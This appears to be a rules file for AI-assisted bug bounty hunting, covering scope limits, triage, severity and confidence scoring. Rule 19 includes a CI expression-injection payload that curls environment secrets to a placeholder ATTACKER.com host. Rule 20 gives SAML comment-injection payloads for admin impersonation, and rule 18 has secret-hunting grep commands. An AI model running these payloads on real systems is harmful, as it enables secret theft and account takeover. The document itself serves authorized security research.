# Hunting Rules

These rules are always active. Breaking them wastes time and reduces payout rate.

---

## 1. READ FULL SCOPE FIRST

Before making a single request: read the program's in-scope and out-of-scope lists.
One out-of-scope request = potential ban. One out-of-scope report = instant close.

```
Read: every in-scope domain
Read: every out-of-scope exclusion
Read: excluded bug classes ("we do not pay for X")
Read: safe harbor clause
```

## 2. NEVER HUNT THEORETICAL BUGS

> "Can an attacker do this RIGHT NOW, against a real user, causing real harm?"
> If NO — STOP. Do not explore further. Do not write it up. Move on.

Theoretical bugs waste your time AND damage your validity ratio when submitted.

```
NOT a bug: "Could theoretically allow..."
NOT a bug: "Wrong but no practical impact"
NOT a bug: "3+ preconditions all simultaneously required"
NOT a bug: Dead/unreachable code
NOT a bug: SSRF with DNS callback only
NOT a bug: Vulnerability whose only entry point requires first exploiting a DIFFERENT vulnerability
```

## 2b. NO VULNERABILITY-DEPENDENT VULNERABILITIES

A vulnerability is only valid as a standalone finding if an attacker can reach it WITHOUT first exploiting another vulnerability.

**Kill immediately if:**
- "To trigger this bug, the attacker must first exploit [other bug] to gain access / bypass the check / reach the endpoint"
- The vulnerable endpoint is only reachable via a broken auth flow that is itself a separate bug
- The payload only lands if a different injection point (also a bug) is used to relay it
- Exploitation requires a prior session/state that can only be created through another unpatched vulnerability

**The distinction:**

| Situation | Valid? |
|---|---|
| Bug A works standalone. Bug B works standalone. Together they escalate impact. | BOTH valid. Report as a chain with higher severity. |
| Bug A requires Bug B to be exploited FIRST before A is even reachable. | Bug A is NOT standalone. Report as ONE chain only if both confirmed. |
| Bug A requires a precondition an attacker can set up WITHOUT exploiting another bug (e.g., register a free account). | Bug A is valid standalone. |

**How to report chains:**
- Confirm BOTH bugs independently exploitable? Report as one chained finding with the combined impact and CVSS.
- Only Bug B confirmed, Bug A depends on B? Report only Bug B. Do not mention A as a separate finding.
- Both confirmed but A depends on B? Report as ONE report covering the full attack chain, not two separate submissions.

## 3. KILL WEAK FINDINGS FAST

Run the 7-Question Gate BEFORE spending time on a finding. Kill at Q1 if needed.

Every minute on a weak finding = a minute not finding a real one.

## 4. CHECK SCOPE EXPLICITLY FOR EVERY ASSET

Not just "does this domain look like the target?" — verify it's on the scope list.
Check: Is it a third-party service they just use? Third-party = out of scope.

## 5. 5-MINUTE RULE

If a target surface shows nothing interesting after 5 minutes → move on.

Kill signals:
- All hosts return 403 or static pages
- No API endpoints with ID parameters
- No JavaScript bundles with interesting paths
- nuclei returns 0 medium/high findings

## 6. AUTOMATION = HIGHEST DUP RATE

Use automation for RECON only (subdomain enum, live hosts, URL crawl).
Manual testing finds unique bugs. Automated scanners find duplicates.

```
Automation: recon (subfinder, httpx, katana, nuclei)
Manual: IDOR testing, auth bypass, business logic, race conditions
```

## 7. IMPACT-FIRST HUNTING

Ask: "What's the worst thing that could happen if auth was broken here?"

If the answer is "nothing valuable" → skip the feature.
If the answer is "admin access, PII exfil, fund theft" → hunt there.

## 8. HUNT LESS-SATURATED BUG CLASSES

High competition (skip unless target-specific): XSS, SSRF basics, open redirect alone
Low competition: Cache poisoning, race conditions, business logic, HTTP smuggling, CI/CD

## 9. DEPTH OVER BREADTH

One target deeply understood > ten targets shallowly tested.

```
Read 5+ disclosed reports for the target before hunting
Understand the business domain
Map the crown jewels (what would hurt the company most?)
```

## 10. THE SIBLING RULE

> "Check EVERY sibling endpoint. If `/api/user/123/orders` requires auth,
> check `/api/user/123/export`, `/api/user/123/delete`, `/api/user/123/share`."

This rule explains 30% of all paid IDOR/auth bugs.

## 11. A→B SIGNAL METHOD

When you confirm bug A → stop → hunt for B and C before writing the report.

A confirmed bug = signal that the developer made a class of mistake.
They made it elsewhere too. Finding B costs 10x less than finding A.

Time-box: 20 minutes on B. If not confirmed → submit A and move on.

## 12. NEW == UNREVIEWED

Features < 30 days old have the lowest security maturity.
Monitor GitHub commits. Hunt new features first.

## 13. FOLLOW THE MONEY

Billing/credits/refunds/wallet = most developer shortcuts taken.
Price manipulation, race conditions on payment, quota bypass = high ROI.

## 14. 20-MINUTE ROTATION RULE

Every 20 min ask: "Am I making progress?"
No → rotate to next endpoint, subdomain, or vuln class.
Fresh context finds more bugs than brute force.

## 15. BUSINESS IMPACT > VULN CLASS

Clickjacking is usually $0 but MetaMask paid $120K for one.
Ask: "What's the business impact?" before estimating severity.

## 16. VALIDATE BEFORE WRITING

Run /validate before starting a report. Gate 0 is 30 seconds.
It takes 30 seconds to kill a bad lead. A report takes 30 minutes to write.

## 17. CREDENTIAL LEAKS NEED EXPLOITATION PROOF

Finding an API key = Informational.
Proving what the key accesses (S3 read, database, admin panel) = Medium/High.

Always call the API as the leaked key. Enumerate permissions.

## 18. MOBILE = DIFFERENT ATTACK SURFACE

Mobile apps expose endpoints that the web app doesn't. Always decompile the APK/IPA when in scope:
- Hardcoded secrets in `strings` output that web recon never finds
- API endpoints in decompiled source that aren't in the web JS
- Deep-link handlers with injection points
- WebView `addJavascriptInterface` = JS→Java bridge (RCE on API < 17)
- Certificate pinning bypass via Frida/objection → MitM all traffic

```bash
# Quick check without rooted device
apktool d target.apk -o target_src
grep -rn "api_key\|secret\|password\|token\|Authorization\|Bearer" target_src/ --include="*.smali" --include="*.xml"
grep -rn "https://" target_src/ | grep -v "schema\|xmlns\|android\|google" | head -50
```

## 19. CI/CD IS ATTACK SURFACE

GitHub Actions / GitLab CI pipelines often have critical secrets. Check BEFORE writing any report on a target with public repos.

```bash
# Clone target's public GitHub org repos, then:
find . -name "*.yml" -path "*/.github/workflows/*" | xargs grep -l "pull_request_target\|secrets\."

# Key dangerous patterns:
# 1. pull_request_target + checkout of PR branch = attacker code runs with repo secrets
# 2. ${{ github.event.issue.title }} in run: block = expression injection = secret exfil
# 3. artifact download without hash check = artifact poisoning
# 4. self-hosted runners = escape to org infrastructure
```

**Expression injection PoC (create an issue with this title):**
```
test"; curl https://ATTACKER.com/$(env | base64 -w0) #
```
If workflow runs → org secrets exfiltrated. CVSS 9.3 (Critical).

## 20. SAML / SSO = HIGHEST AUTH BUG DENSITY

SAML implementations are notoriously buggy. If target uses SSO, always test:
- XML signature wrapping (XSW) — valid signature, injected assertion
- Comment injection — `admin<!---->@company.com` = sign as admin
- XML external entity in SAML assertion
- Signature stripping (remove signature, server still accepts)
- NameID manipulation — change email in unsigned field

```bash
# Capture SAML assertion (base64 decode from SAMLResponse parameter)
echo "SAMLResponse_VALUE" | base64 -d | xmllint --format -

# Test comment injection in NameID
# Change: <NameID>user@company.com</NameID>
# To:     <NameID>admin<!---->@company.com</NameID>
# Or:     <NameID Format="...">admin@company.com</NameID> (duplicate element)
```

> SAML bugs frequently pay High–Critical because they enable SSO bypass across the entire platform.

## 21. FALSE POSITIVE HARD EXCLUSIONS

Auto-kill any finding that fits one of these patterns WITHOUT a concrete chain. Never report standalone.

```
DoS / resource exhaustion (no demonstrated business impact)
Rate limiting issues (informational)
ReDoS without >1 second backtracking proof
Memory/CPU exhaustion in memory-safe language (Go, Rust, Java)
Bug exists only in test files (*.test.*, *.spec.*, __tests__/)
Log injection / log spoofing
SSRF where attacker controls only path (not host/protocol)
User-controlled content to AI/LLM (prompt injection — out of scope most programs)
Missing audit logging
Secrets in files with correct OS permissions (0600, not world-readable)
Client-side auth checks when server enforces separately
UUIDs / ULIDs / CUIDs as IDs (not enumerable)
Environment variables / CLI flags (trusted developer input)
Bugs in unreachable / dead code paths
Documentation or config-only issues
```

**One exception:** Any of the above can be reported if it's part of a confirmed attack chain leading to real impact.

## 22. REACHABILITY CLASSIFICATION

Assign one of these labels to every finding. It determines the true severity.

| Label | Means | Severity Adjustment |
|-------|-------|---------------------|
| **EXTERNAL** | Unauthenticated, public-facing | None — full severity |
| **AUTHENTICATED** | Requires valid user session | Reduce one tier |
| **INTERNAL** | Admin-only / internal services | Reduce two tiers |
| **UNREACHABLE** | Dead code / gated by hard condition | Drop the finding |

> A "Critical" that requires admin credentials is High at best. An UNREACHABLE bug is not a bug.

## 23. EXPLOITABILITY CLASSIFICATION

Classify how hard the finding is to exploit. Include this in every report.

| Label | Means |
|-------|-------|
| **EASY** | Standard technique, no special conditions, publicly documented |
| **MEDIUM** | Requires specific conditions, timing, or chained step |
| **HARD** | Requires insider knowledge, rare race window, or advanced technique |

Easy + External = maximum severity. Hard + Authenticated = likely Medium or lower.

## 24. CONFIDENCE SCORING

Before reporting, assign a confidence score (0–100):

| Score | Label | Report? |
|-------|-------|---------|
| 80–100 | HIGH | Yes — full data flow traced, sink confirmed, mitigations absent |
| 50–79 | MEDIUM | Maybe — some assumptions; trace further before reporting |
| 0–49 | LOW | No — drop or gather more evidence |

**Dual-lens signal:** If two independent analysis paths both find the same issue → confidence automatically HIGH.

**Rule:** Only report at confidence ≥ 70. Below that, investigate more or kill it.

## 25. ADVERSARIAL SELF-CHALLENGE

Before writing any report, spend 5 minutes actively trying to DISPROVE your own finding:

```
1. Is there validation I missed earlier in the call chain?
2. Does a framework/ORM/middleware already prevent this?
3. Is this actually reachable from an attacker-controlled entry point?
4. Could the language runtime / type system prevent exploitation?
5. Is the output rendered in a dangerous context or just stored benignly?
6. Is the output escaped/sanitized at the render layer even if not at input?
7. Does the "sink" actually produce exploitable behavior in this tech stack?
```

If you can disprove it → it is not a bug. Move on.
If you cannot disprove it after this challenge → confidence increases. Report it.

## 27. HARD SCOPE LOCK

When a program scope is given (in-scope domains, wildcard patterns, path exclusions), it is an absolute boundary. Zero exceptions.

```
RULE: If the asset is not explicitly listed in the in-scope list → do not touch it.
RULE: If an asset is listed in the out-of-scope list → immediate hard stop.
RULE: Wildcard *.target.com does NOT cover target.com — check exactly.
RULE: Third-party services (Zendesk, Salesforce, HubSpot, Intercom, etc.) → out of scope
      unless the program explicitly says otherwise.
```

Scope creep is the single most common reason for bans and instant-closes.

**Before every request, ask:** "Is this host in the defined scope list?"
If you must check — the answer is probably no. Stop.

**What NOT to do:**
- You find `api.target.com` in scope → you start testing `admin.target.com` you found in recon
- Scope says `*.target.com` → you test `target-cdn.otherdomain.com` (different domain)
- Scope says `app.target.com` → you test `staging.target.com` (not listed)
- You "assume" a subdomain is in scope because it looks related

**ScopeChecker integration:** Every URL must pass `ScopeChecker.is_in_scope()` before
any request is made. If the scope list is defined and the URL fails the check → hard stop.
No exceptions for "interesting" targets.

## 29. OSS SCOPE PRODUCTION VERIFICATION

When the program scope includes a public open-source codebase (public GitHub/GitLab repo, npm, PyPI, RubyGems, etc.) AND a production domain, exploitability confirmation is allowed via two-path evidence — no triggering required.

**Two-path evidence (both required):**

1. **Code evidence** — trace the full vulnerable code path in the public repo. Confirm the vulnerable version is deployed (see below).
2. **Production evidence (passive only)** — confirm the vulnerable version is live via ONE of:
   - Response headers (`X-Runtime`, `Server`, `X-Powered-By`, `X-Version`, etc.)
   - Public `/version`, `/health`, `/status`, `/api/version` endpoints
   - npm / PyPI / RubyGems / Docker Hub metadata matching a known-vulnerable version
   - `package.json`, `requirements.txt`, or equivalent served publicly
   - GitHub releases / tags matching deployed version

**Payload requirement:** Include the theoretical exploit payload in the report, clearly labeled "NOT EXECUTED IN PRODUCTION — code-confirmed." Do not execute it.

**Hard limits — even for OSS targets:**
```
NEVER: Send the actual exploit payload against production
NEVER: Trigger data exfil, state change, or service disruption
NEVER: Spray production endpoints to confirm exploitability
NEVER: Create accounts or modify data to prove the bug
```

**When two-path evidence is sufficient:** The code is public — anyone can read it. Verifying the deployed version passively does not cause harm. Programs that include OSS repos in scope accept code-level evidence when the version is confirmed deployed.

**When it is NOT sufficient:** If the vulnerable version cannot be confirmed deployed, you do not have a reportable bug. Undeployed code bugs are informational at best.

## 28. MCP BROWSER TOOL POLICY

When a browser MCP is available (claude-in-chrome, playwright-mcp, puppeteer-mcp, or
similar browser automation tools), follow this usage policy:

**USE browser MCP for:**
- Creating test accounts when registration requires CAPTCHA, email verification, or JS-heavy forms
- OAuth flows that require real browser interaction (consent screens, popups)
- Multi-step interactive flows that cannot be replicated with curl
- Anything that requires JavaScript execution to complete authentication
- Verifying XSS execution in a real browser context
- Testing client-side logic that requires a real DOM

**NEVER use browser MCP for:**
- Standard HTTP requests (GET/POST/PUT/DELETE to APIs)
- Anything curl or fetch can handle
- Recon requests (header grabs, endpoint discovery)
- Repeated requests (authentication replays, IDOR testing with known tokens)
- Anything where you already have a session token

**Why this matters:** Browser MCPs add 2-10x latency per request. One curl request = 50ms.
One browser MCP request = 500ms-5s. Using browser MCP for normal HTTP requests will make
the hunt 10x slower with zero benefit.

**Detection:**
- Claude Code: check if `claude-in-chrome` or similar MCP is listed in available tools
- OpenCode: check available tool integrations
- If unsure whether a browser MCP is available → attempt the action with curl first;
  fall back to browser MCP only if curl cannot complete the flow

## 26. FRAMEWORK-AWARE FALSE POSITIVE FILTERS

Before claiming a vulnerability, check if the framework prevents it by default:

| Framework | Claimed Bug | Default Protection |
|-----------|-------------|-------------------|
| **Prisma / SQLAlchemy / ActiveRecord / Hibernate** | SQLi | ORM parameterizes all queries — only `queryRaw`, `.execute()`, `cursor.execute(sql)` are dangerous |
| **Django / Jinja2 / Handlebars / Blade** | XSS | Auto-escape by default — check for `\|safe`, `{!! !!}`, `dangerouslySetInnerHTML`, `raw()` |
| **Express + Helmet.js** | Missing security headers | Helmet sets most headers — check middleware ordering |
| **Joi / Zod / Pydantic / Cerberus** | Missing validation | Schema middleware validates at entry — verify it's applied to the route |
| **Rails protect_from_forgery** | CSRF | On by default — only routes with `skip_before_action :verify_authenticity_token` are exposed |
| **Next.js / Nuxt.js** | SSRF via server fetch | Only if user controls the full URL (not just a path or query) |
| **Reverse proxy (nginx, Cloudflare)** | Rate limiting absent | Proxy may handle rate limiting before the app |

**Verify first, claim second.** One missed framework protection = one wasted report + validity ratio hit.
